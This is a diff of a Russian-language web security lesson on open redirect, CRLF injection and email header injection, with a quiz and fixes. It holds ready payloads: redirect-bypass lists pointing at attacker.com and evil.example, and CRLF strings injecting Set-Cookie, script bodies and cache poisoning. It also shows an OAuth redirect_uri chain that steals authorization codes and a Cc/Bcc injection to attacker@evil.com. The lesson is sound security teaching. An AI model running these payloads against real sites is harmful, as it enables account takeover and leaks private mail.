@@ -14,323 +14,175 @@ estimated_minutes: 34
 summary: "Подмена редиректа, вставка переводов строк в заголовки и письма — и как это усиливает XSS и SSRF."
 ---
 
-Иногда уязвимость сама по себе «низкая», но её комбинация с другой даёт критичный результат. Open Redirect, CRLF-инъекция и инъекция в заголовки email — как раз такие «усилители»: сами по себе они могут быть Medium, но в цепочке с OAuth или XSS превращаются в захват аккаунта. Здесь разберём все три.
+## Вопрос, с которого всё начинается
 
-## Теория: Open Redirect
+Некоторые уязвимости сами по себе «низкие», но в **цепочке** с другой дают критичный результат. Open Redirect, CRLF-инъекция и инъекция в заголовки письма — ровно такие «усилители»: в отрыве это Medium, но в связке с OAuth или XSS они превращаются в захват аккаунта.
 
-**Open Redirect** — когда параметр с URL редиректа не валидируется:
+Вопрос: как из «просто редиректа» получить кражу токена? Разберём три техники на одном примере — приложении с логином и редиректом после него.
 
-```
-GET /login?next=https://evil.com   ->  302 Location: https://evil.com
-```
+## Наш пример
 
-Приложения часто используют `next`/`url`/`redirect`/`return`/`continue`/`callback`. Сам по себе open redirect — Medium, но:
-
-- **OAuth:** если `redirect_uri` доверяет приложению с open redirect, токен/код уводится через цепочку.
-- **Фишинг:** доверенный домен в ссылке повышает доверие.
-- **CSRF:** open redirect на том же домене позволяет обойти проверку `Referer`/`Origin`.
-
-Техники обхода валидации:
-
-```
-https://evil.com
-//evil.com
-https://target.local.evil.com
-https://evil.com#target.local
-https://target.local/redirect?url=https://evil.com
-https://evil.com\target.local
-http://evil.com (смена схемы)
-https:evil.com
-//target.local@evil.com
-```
-
-## Теория: CRLF-инъекция (HTTP Response Splitting)
-
-Если ввод попадает в **заголовок ответа** (например, `Location`), а приложение не фильтрует `\r\n`, вы можете добавить свои заголовки или даже тело:
-
-```
-/redirect?url=https://x%0d%0aSet-Cookie:admin=1
-```
-
-`%0d%0a` = CRLF. Результат — сервер отдаёт:
-
-```
-Location: https://x
-Set-Cookie: admin=1
-```
-
-Это **CRLF injection / HTTP response splitting**. Варианты: `%0a` (LF), `%0d` (CR), `%0d%0a`, двойное кодирование `%250d%250a`. Последствия: cookie injection (session fixation), XSS (если после CRLF вставить `\r\n\r\n<script>`), кэш-poisoning (см. `web-cache-poisoning`).
-
-## Теория: Email Header Injection
-
-Если приложение формирует письмо, вставляя ваш ввод в заголовки (например, имя в поле `From`/`Subject`), `\r\n` позволяет добавить **свои заголовки**:
-
-```
-Name: test\r\nBcc: attacker@evil.com
-```
-
-Результат — письмо уходит скрытой копией атакующему (утечка содержимого) или рассылка спама через доверенный домен. Также инъекция в `To`/`Reply-To`.
-
-## Инструменты: curl и декодирование
-
-Проверить редирект, не следуя за ним:
+Есть приложение `app.example`. После логина оно возвращает пользователя на страницу, указанную в параметре `next`:
 
 ```bash
-curl -s -i 'https://target.local/login?next=https://evil.com' | grep -i '^location'
+$ curl -s -i 'https://app.example/login?next=/dashboard' | grep -i '^location'
+Location: /dashboard
 ```
 
-Проверить CRLF (кодируем `\r\n` в URL):
+Параметр `next` управляет заголовком `Location`. Что, если подставить туда внешний адрес?
 
 ```bash
-curl -s -i 'https://target.local/redirect?url=https://x%0d%0aX-Injected:yes'
+$ curl -s -i 'https://app.example/login?next=https://evil.example' | grep -i '^location'
+Location: https://evil.example
 ```
 
-Смотрим, появился ли заголовок `X-Injected: yes` в ответе.
+Сервер **без проверки** перенаправил нас на чужой домен. Это **Open Redirect** — открытый редирект. Сам по себе он выглядит безобидно, но посмотрим, во что он превращается.
 
-Декодировать/кодировать:
+## Шаг 1: где живёт open redirect
+
+Приложения используют разные имена параметра для редиректа: `next`, `url`, `return`, `continue`, `redirect`, `dest`, `callback`. Найти их можно в JS-файлах и HTML форм:
 
 ```bash
-python3 -c "import urllib.parse as u; print(u.quote('a\r\nb'))"
+$ grep -rEo '(next|url|return|redirect|dest|callback)=[^&"]*' /tmp/site-js/ | sort -u
 ```
 
-В **Burp** удобно смотреть «сырой» ответ Repeater — новые заголовки видны сразу.
+Сам по себе open redirect — Medium. Ценность появляется в комбинации:
 
-## Разобранный пример: open redirect → обход OAuth redirect_uri
+- **OAuth/SSO:** провайдер доверяет `redirect_uri` нашему домену, а тот редиректит дальше на чужой;
+- **фишинг:** в ссылке стоит доверенный домен, что повышает доверие жертвы;
+- **CSRF:** редирект на том же домене помогает обойти проверку `Referer`/`Origin`.
 
-Шаг 1. Находим open redirect:
+## Шаг 2: обход валидации
+
+Наивная защита «запретить `https://evil`» обходится десятком способов. Основные:
+
+| Валидация | Обход |
+|-----------|-------|
+| `startsWith('https://allowed.com/')` | `https://allowed.com@attacker.com` (userinfo) |
+| `includes('allowed.com')` | `https://attacker.com/allowed.com` (в пути) |
+| `host === 'allowed.com'` | `https://allowed.com.attacker.com` (поддомен) |
+| блок `//` в начале | `https:/attacker.com` (один слэш) |
+| блок `/` в начале | `\/\/attacker.com` (обратные слеши) |
+| проверка до декодирования | `%252f%252fattacker.com` (двойное кодирование) |
+| проверка только схемы | `https:attacker.com` (схема без `//`) |
 
 ```bash
-curl -s -i 'https://app.target.local/out?url=https://evil.com' | grep -i '^location'
-# Location: https://evil.com   <-- open redirect
+$ curl -s -o /dev/null -w '%{redirect_url}\n' \
+  'https://app.example/login?next=//evil.example'
+//evil.example
 ```
 
-Шаг 2. Замечаем, что OAuth-провайдер доверяет домену `app.target.local`. Строим `redirect_uri` через open redirect:
+`//evil.example` — «scheme-relative» URL: браузер подставит текущую схему (`https`) и уйдёт на чужой домен. Валидация, которая проверяет только начало строки, это пропустит.
 
-```
-https://idp.target.local/authorize?client_id=app&redirect_uri=https://app.target.local/out%3Furl%3Dhttps://evil.com&response_type=code
-```
+## Шаг 3: превращаем редирект в кражу токена
 
-Шаг 3. Провайдер видит доверенный `redirect_uri` (`app.target.local`), редиректит туда с `code`, а приложение перекидывает на `evil.com` — код утекает. Цепочка: open redirect + слабая валидация redirect_uri = захват аккаунта.
-
-## Разобранный пример: CRLF → session fixation
-
-Шаг 1. Проверяем инъекцию:
-
-```bash
-curl -s -i 'https://app.local/r?u=%0d%0aSet-Cookie:SID=attacker'
-```
-
-Ответ:
-
-```
-HTTP/1.1 302 Found
-Location: 
-Set-Cookie: SID=attacker
-```
-
-Шаг 2. Теперь можно навязать жертве известный `SID` (session fixation, см. `web-cookies-sessions`). Если сервер не ротирует сессию после логина — захват аккаунта.
-
-Шаг 3. Вариант XSS: `%0d%0a%0d%0a<script>alert(1)</script>` — тело ответа начинается с вашего скрипта.
-
-## Разобранный пример: email header injection
-
-Шаг 1. Форма «связаться» принимает `name` и `message`. Пробуем:
-
-```
-name = test%0d%0aBcc:attacker@evil.com
-```
-
-Шаг 2. Если приложение не фильтрует, письмо уйдёт с вашим `Bcc` → вы получаете копию всех писем. Это утечка и спам-вектор.
-
-## Частые ошибки
-
-- **Недооценивать open redirect.** Сам по себе Medium, но в OAuth-цепочке — Critical. Всегда ищите, где он «усиливает».
-- **Пробовать только `https://evil.com`.** Обходы (`//evil.com`, `@`, `#`, tab, смена схемы) часто проходят.
-- **Забывать про кодирование.** CRLF нужно кодировать (`%0d%0a`), иногда дважды.
-- **Путать CRLF в запросе и в ответе.** Инъекция опасна, когда ввод попадает в **заголовки ответа**.
-- **Игнорировать email.** Инъекция в заголовки письма — частая находка в контактных формах.
-- **Тестировать спамом.** Не рассылайте письма массово; используйте свой ящик для проверки.
-
-## Полный арсенал payload'ов для open redirect
-
-Обход валидации redirect-параметра — отдельное искусство. Держите под рукой набор.
+Теперь цепочка. Есть OAuth-провайдер `idp.example`, который **строго** проверяет `redirect_uri` — принимает только `https://app.example/cb`. Но `app.example/cb` после обмена кода делает редирект на параметр `next` без проверки:
 
 ```text
-//attacker.com               # scheme-relative
-https:/attacker.com         # один слэш
-https:///attacker.com       # три слэша
-https://attacker.com\@allowed.com
-https://allowed.com@attacker.com
-https://allowed.com.attacker.com
-https://allowed.com%09.attacker.com
-\/\/attacker.com
-https:attacker.com
-https://attacker.com#allowed.com
-https://attacker.com?allowed.com
-//attacker.com/%2f..%2f
-%0d%0aLocation:%20https://attacker.com
+https://idp.example/authorize?client_id=app
+  &redirect_uri=https://app.example/cb?next=https://evil.example
+  &response_type=code&scope=openid
 ```
 
+Провайдер видит **доверенный** `redirect_uri` (`app.example`), отдаёт туда `code`, а приложение перекидывает на `evil.example` **вместе с кодом**. Мы получаем код авторизации и меняем его на токен. Цепочка «open redirect + слабая валидация `next`» = захват аккаунта. Именно поэтому open redirect на OAuth-домене — это уже не Medium, а Critical.
+
+## Шаг 4: CRLF-инъекция
+
+Вторая техника — вставка переводов строк в **заголовки ответа**. Строка HTTP-заголовка заканчивается символами CR (`\r`) и LF (`\n`); если приложение вставляет наш ввод в заголовок без фильтрации, мы можем добавить **свои** заголовки.
+
+`%0d%0a` — это URL-кодирование `\r\n`. Проверим:
+
 ```bash
-# проверяем редирект без следования за ним
-curl -s -o /dev/null -w '%{redirect_url}\n' \
-  'https://app.example/redirect?next=//attacker.com'
-# если вывод содержит attacker.com -> open redirect
+$ curl -s -i 'https://app.example/login?next=https://x%0d%0aX-Injected:yes' | grep -i 'x-injected'
+X-Injected: yes
 ```
 
-## Валидация redirect: типичные ошибки и обходы
-
-| Проверка | Ошибка | Обход |
-|----------|--------|-------|
-| `startswith('https://allowed.com')` | суффикс не проверен | `https://allowed.com.attacker.com` |
-| `contains('allowed.com')` | подстрока | `https://attacker.com/?allowed.com` |
-| regex без якорей | частичное совпадение | `https://xallowed.com` |
-| проверка только домена | игнор пути | `allowed.com/../../` |
-| allowlist по схеме | нет проверки хоста | `https://attacker.com` |
-| декодирование после проверки | двойное кодирование | `%2f%2fattacker.com` |
-
-Ключевое правило: валидируйте **после** полного декодирования и нормализации, сравнивая разобранный хост, а не строку.
-
-## CRLF-инъекция: HTTP Response Splitting
-
-Если ввод попадает в заголовок ответа (`Location`, `Set-Cookie`, кастомный) без фильтрации `\r\n`, можно вставить свои заголовки и даже тело.
+Наш заголовок `X-Injected` появился в ответе. Это **CRLF-инъекция** (или HTTP Response Splitting). Что можно сделать:
 
 ```bash
-# 1) вставка произвольного заголовка
-curl -s 'https://app.example/lang?x=%0d%0aSet-Cookie:%20admin=1'
-# 2) подмена тела ответа (response splitting)
-curl -s 'https://app.example/lang?x=%0d%0a%0d%0a<script>alert(1)</script>'
-# 3) вставка нескольких заголовков
-curl -s 'https://app.example/lang?x=%0d%0aContent-Length:%200%0d%0a%0d%0a'
+# 1) вставить cookie (session fixation)
+$ curl -s -i 'https://app.example/login?next=x%0d%0aSet-Cookie:SID=attacker'
+# 2) подменить тело ответа (XSS)
+$ curl -s -i 'https://app.example/login?next=x%0d%0a%0d%0a<script>alert(1)</script>'
 ```
 
-Признак уязвимости — появление ваших заголовков в ответе. Фильтр обычно режет `\r\n`, но пропускает `%0d%0a`, `\r\n` в разных кодировках или `\u000d\u000a`.
+Двойной `%0d%0a%0d%0a` завершает заголовки и начинает **тело** ответа — так вставляется свой HTML со скриптом. Варианты обхода фильтра: `%0a` (только LF), `%0d`, `%250d%250a` (двойное кодирование), `\u000d\u000a`.
 
-## Email Header Injection
+## Шаг 5: инъекция в заголовки письма
 
-Если пользовательский ввод попадает в заголовки письма (`To`, `Subject`, `Cc`), можно добавлять получателей и подменять тело.
+Третья техника — та же логика, но в письмах. Если форма обратной связи вставляет имя в заголовок письма (`From`, `Subject`), `\r\n` позволяет добавить **свои** заголовки:
 
 ```bash
-# добавляем скрытого получателя
-curl -s -X POST https://app.example/feedback \
+$ curl -s -X POST https://app.example/feedback \
   --data-urlencode 'email=victim@x.com%0aCc:attacker@evil.com' \
   --data 'message=hi'
-# подменяем тело письма
-curl -s -X POST https://app.example/feedback \
-  --data-urlencode $'email=a@x.com%0d%0a%0d%0aPhishing body'
 ```
 
-Риски: рассылка спама от имени домена, фишинг, утечка данных через `Bcc`.
+Строка `Cc:attacker@evil.com` после перевода строки становится **скрытым получателем** — копия письма уходит нам. Это утечка содержимого и вектор спама от имени доверенного домена. Аналогично инъецируют `Bcc`, `To`, `Reply-To`, а двойным `\r\n\r\n` подменяют тело письма.
 
-## Разобранный пример: open redirect → обход OAuth redirect_uri
+## Шаг 6: что делать и как фиксить
 
-Цепочка: OAuth-сервер строго проверяет `redirect_uri`, но в приложении есть открытый редирект.
+**Тестирование:**
 
-```text
-# redirect_uri разрешён строго: https://app.example/cb
-# но /cb?next=... не проверяет next
-https://auth.example/authorize?client_id=app\
-&redirect_uri=https://app.example/cb?next=https://attacker.example\
-&response_type=code&scope=openid
-# код авторизации уходит на app.example/cb, который редиректит на attacker
-```
+1. найди redirect-параметры (`next`, `url`, `return`, `dest`, `callback`);
+2. проверь реакцию через `Location` в ответе, **не следуя** за редиректом;
+3. перебери обходы (userinfo, поддомен, слэш, кодировки);
+4. проверь CRLF (`%0d%0a`) в параметре, идущем в заголовок;
+5. проверь формы обратной связи на инъекцию в заголовки письма;
+6. оцени цепочку (OAuth/SSO) и оформи PoC.
 
-Атакующий получает `code` и обменивает его на токен. Именно так open redirect превращается в захват аккаунта.
+**Защита** (для понимания): валидируй редирект **после** полного декодирования и нормализации, сравнивая разобранный хост, а не строку; используй белый список; для CRLF — запрещай `\r`/`\n` в любом вводе, идущем в заголовки.
 
-## Что делать дальше / решение
+## Шаг 7: CRLF → cache poisoning
 
-1. **Найдите redirect-параметры.** `next`, `url`, `return`, `continue`, `redirect`, `dest`.
-2. **Проверьте реакцию.** Смотрите `Location` в ответе (`%{redirect_url}`).
-3. **Переберите payload'ы.** Из списка выше, включая кодировки.
-4. **Проверьте CRLF.** Вставка `%0d%0a` в параметр, идущий в заголовок.
-5. **Проверьте email-заголовки.** Формы обратной связи, приглашения.
-6. **Оцените цепочку.** Open redirect + OAuth = захват аккаунта; зафиксируйте PoC.
-
-## Практика и справочники
-
-- **PortSwigger Academy** — «Open redirection», «HTTP response splitting».
-- **HackTricks** — «Open Redirect», «CRLF Injection».
-- **PayloadsAllTheThings** — «Open Redirect», «CRLF Injection».
-- **OWASP WSTG** — `WSTG-CLNT-04`.
-
-## Расширенный список обходов (с кодировками)
-
-Полезно иметь таблицу «валидация → обход» под рукой:
-
-| Валидация | Обход | Пояснение |
-|-----------|-------|-----------|
-| `startsWith('https://allowed.com/')` | `https://allowed.com@attacker.com` | userinfo |
-| `includes('allowed.com')` | `https://attacker.com/allowed.com` | путь |
-| `host === 'allowed.com'` | `https://allowed.com.attacker.com` | поддомен |
-| блок `/` в начале | `\/\/attacker.com` | backslash |
-| блок `//` | `https:/attacker.com` | один слэш |
-| декодирование после проверки | `%252f%252fattacker.com` | двойное кодирование |
-| проверка только схемы | `https:attacker.com` | схема без `//` |
-| нормализация пути | `https://attacker.com/../` | dot-segments |
+Есть ещё одно последствие CRLF-инъекции, которое часто упускают: **отравление кэша**. Если между тобой и приложением стоит кэш (CDN, обратный прокси), он кэширует ответ по URL. Вставив через CRLF свои заголовки, можно заставить кэш сохранить **подменённый ответ** и отдавать его другим пользователям:
 
 ```bash
-# прогон всех вариантов и печать Location
-while read u; do
-  printf '%-45s -> ' "$u"
-  curl -s -o /dev/null -w '%{redirect_url}\n' \
-    "https://app.example/go?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")"
-done < payloads.txt
+$ curl -s 'https://app.example/page?x=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<script>alert(1)</script>'
 ```
 
-Автоматизация через `ffuf` с `-mr` по домену атакующего быстро выявляет рабочий вариант.
+Если кэш это проглотит, любой, кто откроет `/page?x=...`, получит наш скрипт — это уже stored XSS на всех. Детали — в `web-cache-poisoning`. Поэтому CRLF-инъекцию стоит проверять не только на прямом ответе, но и **через кэш**: тот же запрос повторяется дважды, и второй раз проверяется, что отдаётся именно подменённое содержимое.
 
-## Что делать дальше / решение (кратко)
+## Что мы теперь знаем
 
-1. Соберите все redirect/return-параметры (`grep` по JS и HTML).
-2. Проверьте `Location` в ответе, а не финальную страницу.
-3. Переберите таблицу обходов и кодировок.
-4. Проверьте CRLF и email-заголовки отдельно.
-5. Оцените цепочку (OAuth/SSO) и оформите PoC.
+- Open Redirect — параметр управляет `Location` без проверки.
+- Сам по себе Medium, но с OAuth/SSO — захват аккаунта.
+- Обходы: userinfo (`@`), поддомен, один слэш, кодировки.
+- CRLF (`%0d%0a`) вставляет свои заголовки и тело ответа.
+- Email header injection добавляет `Cc`/`Bcc` — утечка письма.
+- Все три — «усилители»: ищи, что они позволяют в цепочке.
+- Артефакт — `Location: evil.example`, вставленный заголовок, чужой `Cc`.
 
-## Практика
+## На что смотреть дальше
 
-- **PortSwigger Academy** — лаборатории Open redirection (1–4).
-- **PayloadsAllTheThings** — `Open Redirect` + `CRLF Injection`.
-- **HackTricks** — `Open Redirect`.
-
-## Быстрый чек-лист open redirect / CRLF
-
-| Шаг | Проверка | Ожидаемый признак |
-|-----|----------|-------------------|
-| 1 | найти redirect-параметр | `next`/`url`/`return`/`dest` |
-| 2 | внешний домен | `Location: //attacker.com` |
-| 3 | кодировки | `%2f%2f`, двойное кодирование |
-| 4 | userinfo/subdomain | `allowed.com@attacker.com` |
-| 5 | CRLF | `%0d%0a` в ответе |
-| 6 | цепочка OAuth | кража `code` |
-
-Шесть строк — минимальный аудит; найденный рабочий редирект оформляется PoC с полным URL и заголовком `Location`.
-
-## Почему это важно на практике
-
-Open redirect сам по себе часто считают «низким» риском, но в цепочке он превращается в захват аккаунта: OAuth/SSO доверяют `redirect_uri`, а приложение-получатель редиректит дальше по непроверенному параметру. CRLF-инъекция, в свою очередь, позволяет вставить произвольные заголовки ответа — вплоть до подмены `Set-Cookie` и разделения HTTP-ответа. Обе техники дешёвы в проверке (один `curl`) и хорошо документируются, поэтому их стоит включать в стандартный чек-лист каждого веб-теста и фиксировать даже при «низкой» отдельной критичности — как звено более серьёзной атаки.
+- **Недооценивать open redirect нельзя** — всегда ищи, где он «усиливает» (OAuth, SSO, CSRF).
+- **Пробуй не только `https://evil.com`** — обходы через `@`, `#`, tab, смену схемы часто проходят.
+- **CRLF нужно кодировать** (`%0d%0a`), иногда дважды; смотри «сырой» ответ в Burp.
+- **CRLF опасен только в заголовках ответа**, не в теле.
+- **Проверяй email-формы** — инъекция заголовков частая находка.
+- **Не рассылай спам** — проверяй на своём ящике.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
 - question: "Что такое open redirect?"
   options:
-    - "Редирект на произвольный внешний URL через параметр без валидации"
     - "Редирект на 404"
+    - "Редирект на произвольный внешний URL через параметр без валидации"
     - "Внутренний роутинг SPA"
-    - "Кэширование редиректов"
-  answer: 0
+    - "Кеширование редиректов"
+  answer: 1
   explanation: "Параметр `next`/`url` управляет `Location` без проверки."
 - question: "Какие символы используются для CRLF-инъекции?"
   options:
-    - "`\t\n`"
-    - "`\r\n` (кодируются как `%0d%0a`)"
-    - "`\0`"
+    - "`\\t\\n`"
+    - "`\\r\\n` (кодируются как `%0d%0a`)"
+    - "`\\0`"
     - "`%20`"
   answer: 1
-  explanation: "CR (`\r`) + LF (`\n`) завершают строку заголовка."
+  explanation: "CR + LF завершают строку заголовка."
 - question: "К чему приводит HTTP response splitting?"
   options:
     - "К утечке TLS-ключа"
@@ -338,28 +190,32 @@ Open redirect сам по себе часто считают «низким» р
     - "К SQL-инъекции"
     - "К отказу DNS"
   answer: 1
-  explanation: "Вставив CRLF, вы добавляете заголовки или тело ответа."
-- question: "Как email header injection может привести к утечке?"
+  explanation: "Вставив CRLF, вы добавляете свои заголовки или тело ответа."
+- question: "Как email header injection приводит к утечке?"
   options:
     - "Через шифрование письма"
-    - "Через добавление `Bcc: attacker@evil.com`"
+    - "Через добавление `Cc`/`Bcc: attacker@evil.com`"
     - "Через смену темы"
     - "Через вложение"
   answer: 1
-  explanation: "Инъекция `Bcc` отправляет копию письма атакующему."
+  explanation: "Инъекция скрытого получателя отправляет копию письма атакующему."
 - question: "Почему open redirect усиливает OAuth-атаки?"
   options:
     - "Он ускоряет обмен кода"
-    - "Доверенный `redirect_uri` можно превратить в переадресацию на домен атакующего, украв код"
+    - "Доверенный `redirect_uri` превращается в переадресацию на домен атакующего — код авторизации утекает"
     - "Он шифрует токен"
-    - "Он отключает state"
+    - "Он отключает `state`"
   answer: 1
-  explanation: "Провайдер доверяет домену, а тот редиректит на `evil.com`."
+  explanation: "Провайдер доверяет домену, а тот редиректит на `evil.com` с кодом."
 ```
+
+## Куда дальше
+
+Дальше мы разберём **dangling markup** — технику, которая «утекает» данные из страницы без JavaScript, ломая разметку. А пока главное запомни: open redirect, CRLF и email injection — это **усилители**, и их ценность раскрывается в цепочке.
 
 ## Где пригодится
 
 - **CTF (Web):** цепочки «open redirect → OAuth» и CRLF → XSS — частые сюжеты задач.
 - **Bug bounty:** open redirect на OAuth-домене, CRLF, email injection — валидные находки разного уровня.
 - **Пентест:** проверка редиректов и инъекций в заголовки — обязательный пункт веб-тестирования.
-- **Работа (AppSec/Dev):** whitelist редиректов и фильтрация CRLF — базовая защита, которую вы будете проверять в коде.
+- **Работа (AppSec/Dev):** whitelist редиректов и фильтрация CRLF — базовая защита.
